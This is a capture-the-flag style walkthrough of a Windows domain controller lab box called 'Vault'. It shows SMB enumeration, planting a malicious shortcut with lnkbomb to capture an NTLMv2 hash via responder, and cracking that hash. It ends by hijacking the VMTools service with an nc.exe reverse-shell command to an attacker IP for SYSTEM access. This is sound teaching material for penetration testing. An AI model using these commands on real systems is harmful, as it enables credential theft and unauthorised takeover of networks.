# Vault

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.240.172
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 15:05 +08
Nmap scan report for 192.168.240.172
Host is up (0.18s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49689/tcp open  unknown
49704/tcp open  unknown
```

Loads of ports.&#x20;

### Guest Shares

There were some shares that `smbmap` picked up on with `guest` credentials:

```
$ smbmap -u guest -p '' -H 192.168.240.172                  
[+] IP: 192.168.240.172:445     Name: 192.168.240.172                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DocumentsShare                                          READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```

Within the DocumentsShare share, there was nothing within it:

```
$ smbclient -U guest //192.168.240.172/DocumentsShare 
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul  7 15:06:47 2023
  ..                                  D        0  Fri Jul  7 15:06:47 2023

                7706623 blocks of size 4096. 656179 blocks available
```

There was nothing else about this machine. This reminded me of a few HTB machines where we had to place a malicious file that would trigger a user to click on, which would send requests to our attacker machine and allow us to capture NTLM hashes on `responder`.&#x20;

There a few methods of creating such files, but I used this repository:

{% embed url="https://github.com/dievus/lnkbomb" %}

```
$ python3 lnkbomb.py -t \\192.168.240.172\DocumentsShare -a 192.168.45.216


██      ███    ██ ██   ██ ██████   ██████  ███    ███ ██████
██      ████   ██ ██  ██  ██   ██ ██    ██ ████  ████ ██   ██
██      ██ ██  ██ █████   ██████  ██    ██ ██ ████ ██ ██████
██      ██  ██ ██ ██  ██  ██   ██ ██    ██ ██  ██  ██ ██   ██
███████ ██   ████ ██   ██ ██████   ██████  ██      ██ ██████

                 Malicious Shortcut Generator               
                    A project by The Mayor                  

Malicious shortcut named fuxiylyrbv.url created in the \192.168.240.172DocumentsShare file share.

Recovery file fuxiylyrbv.recovery created in your current directory.

Run python3 lnkbomb.py -r fuxiylyrbv.recovery to remove the file from the target share.

$ mv '\192.168.240.172DocumentsShare\fuxiylyrbv.url' test.url
```

Afterwards, we can place this file within the share and start a `responder` instance, which would immediately capture a hash:

<figure><img src="../../../.gitbook/assets/image (3404).png" alt=""><figcaption></figcaption></figure>

This can be cracked almost instantly:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:03 DONE (2023-07-07 15:13) 0.2857g/s 3031Kp/s 3031Kc/s 3031KC/s Seifer@14..Schsutar90
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Then, we can `evil-winrm` in:

<figure><img src="../../../.gitbook/assets/image (2018).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Server Operators --> DA

Our current user was part of the Server Operators group:

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> net user anirudh
User name                    anirudh
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/19/2021 1:59:51 AM
Password expires             Never
Password changeable          11/20/2021 1:59:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/17/2023 2:43:54 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Since we are part of this group, we can do loads of things like manipulate services and what not.&#x20;

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> services

Path                                                                           Privileges Service          
----                                                                           ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"               True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                  True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\NisSrv.exe"        True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\MsMpEng.exe"       True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc
```

We can abuse the VMTools service.

```
sc.exe config VMTools binpath="C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.216 21"
sc.exe stop VMTools
sc.exe start VMTools
```

A SYSTEM shell would spawn on a listener port:

<figure><img src="../../../.gitbook/assets/image (2539).png" alt=""><figcaption></figcaption></figure>

Rooted!
